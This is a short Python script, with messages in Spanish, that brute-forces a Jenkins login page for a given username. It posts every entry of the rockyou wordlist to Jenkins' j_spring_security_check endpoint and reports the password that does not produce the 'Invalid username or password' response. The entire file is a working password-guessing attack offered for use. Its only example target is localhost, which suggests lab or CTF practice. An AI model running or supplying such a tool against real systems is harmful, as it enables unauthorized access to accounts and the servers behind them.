import requests
import sys
from tqdm import tqdm

def usage():
    print("Uso: python jenkins_brute_force.py <URL> <USUARIO>")
    print("Ejemplo: python jenkins_brute_force.py http://localhost:8080 feer248")

def brute_force(url, user, wordlist_file):
    session = requests.Session()

    with open(wordlist_file, "r", encoding="latin-1") as file:
        passwords = file.readlines()

    progress_bar = tqdm(passwords, desc="Probando contraseñas", unit="intento", ncols=100)
    
    for password in progress_bar:
        password = password.strip()
        
        data = {
            "j_username": user,
            "j_password": password,
            "from": "/oops",
            "Submit": "Sign In"
        }

        try:
            response = session.post(url + "/j_spring_security_check", data=data)
            
            if "Invalid username or password" in response.text:
                continue
            else:
                progress_bar.close()
                print(f"\n\033[32m[ÉXITO] Contraseña encontrada: {password}\033[0m")  
                break
        except requests.RequestException as e:
            print(f"Error al intentar con la contraseña {password}: {e}")
            continue

if __name__ == "__main__":

    if len(sys.argv) < 3:
        usage()
        sys.exit(1)
    
    url = sys.argv[1]
    user = sys.argv[2]
    
    wordlist_file = "/usr/share/wordlists/rockyou.txt"
    
    print(f"Iniciando ataque de fuerza bruta a {url} con el usuario {user}...\n")
    brute_force(url, user, wordlist_file)
